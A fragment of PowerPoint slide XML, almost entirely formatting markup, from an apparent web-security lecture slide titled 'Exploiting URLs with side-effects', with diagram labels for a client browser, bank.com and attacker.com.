                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2780"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2118" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>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55870366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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82947" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82948" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82949" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82952" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82953" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
